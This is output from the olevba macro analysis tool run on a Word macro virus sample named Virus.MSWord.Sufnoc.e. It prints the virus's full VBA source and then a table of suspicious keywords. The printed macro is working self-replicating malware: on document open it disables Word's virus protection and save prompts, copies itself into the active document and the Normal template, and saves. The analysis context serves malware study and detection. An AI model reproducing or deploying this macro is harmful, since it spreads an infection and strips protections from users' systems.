olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sufnoc.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sufnoc.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
If Day(Now) = 31 Then
Application.WindowState = wdWindowStateNormal
A = Application.Height
For B = 1 To A
Application.Height = A - B
Application.ScreenUpdating = False
DoEvents
Next
Application.Caption = "ATTENTION: Elvis Has Left The Building!"
End If
Set C = Options
C.VirusProtection = 0
C.SaveNormalPrompt = 0
C.ConfirmConversions = 0
For D = 1 To 3
If D = 1 Then Set E = ThisDocument
If D = 2 Then Set E = ActiveDocument
If D = 3 Then Set E = NormalTemplate
Set F = E.VBProject.VBComponents.Item(1).CodeModule
If D = 1 Then G = F.Lines(1, F.CountOfLines)
If D <> 1 Then F.DeleteLines 1, F.CountOfLines
If D <> 1 Then F.AddFromString G
Next
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

